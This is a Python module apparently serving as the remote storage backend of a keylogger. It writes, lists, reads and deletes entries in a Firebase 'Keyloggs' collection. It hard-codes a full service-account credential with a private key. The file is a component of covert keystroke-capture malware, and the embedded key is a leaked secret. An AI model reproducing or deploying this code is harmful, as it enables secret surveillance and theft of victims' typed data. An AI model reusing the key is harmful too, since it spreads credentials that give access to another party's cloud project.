import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore


class Database:
    def __init__(self):
        Key = {
            "type": "service_account",
            "project_id": "keyloggs-fa0a2",
            "private_key_id": "773d997ea24870a7e87a5a75d2acf3487861c6d9",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCkAkS78x/wSqcD\nOXmFfzTNiIPb9hbdJhLGPKY9wtKfYmQOlkOGybldCxeRcBB9KBGt/uNu6sLsj7oa\nmzVkWLx6DV0pCJy5XuO+E1UUxfy0tSQDpC7yOLCsRJTFA4JLaCergSMUHdSWG4Ei\n01Jk9G/YwQk9ax96hBXx1vSLF/GS4jxzp4e4OPAZqa5PeCqIVYZyJ18U/WVBkMG0\nWT8ELP3NnnI4mLMhfKvq8y+fuGXiLaKcPyGN17WuzsFUOA61Cqp2FJVBZBadXPbM\nZ3z09R+9zB42hU2HsA7rYpHLtG8NGJdp0e4ljAAoObjA5OVpyt35tRo+rUVTstdu\nWGCwewO5AgMBAAECggEALRCAgWI28ugYRt8KgH9o61ao4I4YTzCwdO7iQNMg23GG\nC6oHKOiRubqcAbbYmQMjBHumU2pHIAgH+1qNS6LEOwckA2vd4GNt0WLvfFNAcgjZ\nufRpf93K0bLQa+fga8bVK59Cm7rsmEg7be3B1IKDnvu/hbRDBH95pidJr1RnaNO2\n4VK3YTSNmRSAui3NbVXy2G6OJlaUpAFcrxlP8VpNB6mHlcbmNbXGpiHcJgGY7RaJ\nzfvawy6Ym6dRkCHnKxHDAzPhfaVM6HWgrjwmwL3StmT/CQSh7Orun6HVZCTIwujF\nUQgDvvkLjg4v7ItLXc9fkPcCVN1ovIJ3JB7kRCt6zwKBgQDiEoe1I0PQ/EWYDhuW\nu+2nKVhDHDxxSlRn3o9N3DudCE4YSGRTYW45oEB1qLutfYaShmfwyAVA8/jWY7tR\n5uLrWGTlUTeejP9IJItxKpEhmO2UJ6ilRbzQkWRUbbsZPViKqiiBaxidC4SI09wK\n8Cz2fw5Rq1LeLBO3nYEt94AzMwKBgQC5uHB/SFb3z9xm9zzH9MKu77z7eYkwmqqR\nM3eZwkzMLroU3wRuA8TUUIFgrmUwkWnBrp7yhOB/X9EaOTfkDL5WsM4fIW3Vs/dz\naxgo69rMjCBcm7xoi+tqug90j+uhzU/HzWzzpfX97Ruv4F1gsI1i+ngbb+TupsbB\n1nShi3vtYwKBgBaFpBFupvXt+/zvAt6ccEuj+dANwxPCRPBoIryuAR5e0nDm3V/V\nKAcDqQhPvArHo517WGWLd8KFy7eIDgRVzSuHDd4unizkfRYx1dZ7WCQRuTF2Vf3J\nGctpgKZMnEQicWy3EPv7sGMM37JF8PkB/mi8Na/7MnFB0OENBu6OZq4zAoGAHSJy\n+3S0t/FyyPBWJ6Qc+mZ/hg+91tMcmOSzCXryo0FdTbLitgN/WDM86JbTJvhY19p1\n8uOneDPm0K9TNkJNhbn8y+NpoJG36vJM+vZs/5On6/8+YkQ47Sg9DnMZauuTbWur\ngNlzKp+MrV2MKIPp2jIir2MxTcL6ASSMbV89VLMCgYEAvKiM7plUUGYfrNkiD4IG\nYjhu/KeFqjekuu+Rl6Mg4XfH/ZKRIGZm0gC9U7qYkS2Y9sOlCchvlTWU4gKhnoG6\nMLcbvyEoG4C/kFXSe+aUPjzo94raRGl2iyMwKDElIyxrEBtmEpv7Pgi1ManEbM2q\n6/pRxYovFc01u5RJUPEmeB4=\n-----END PRIVATE KEY-----\n",
            "client_email": "firebase-adminsdk-awu0k@keyloggs-fa0a2.iam.gserviceaccount.com",
            "client_id": "111929317456432139111",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
            "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
            "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-awu0k%40keyloggs-fa0a2.iam.gserviceaccount.com",
            "universe_domain": "googleapis.com"
        }
        cred = credentials.Certificate(Key)
        firebase_admin.initialize_app(cred)
        self.db = firestore.client()

    def Add(self, data, time):  # add a save to DB
        self.db.collection("Keyloggs").document(time).set({"data": data})

    def Delete(self, time):  # delete document from DB by saving time
        self.db.collection("Keyloggs").document(time).delete()

    def ShowTime(self):  # returns a list of al saving times
        arr = []
        docs = self.db.collection('Keyloggs').get()
        for doc in docs:
            arr.append(doc.id)
        return arr

    def ShowData(self, time):  # returns saved data by saving time
        data = self.db.collection("Keyloggs").document(time).get().to_dict()
        return data['data']

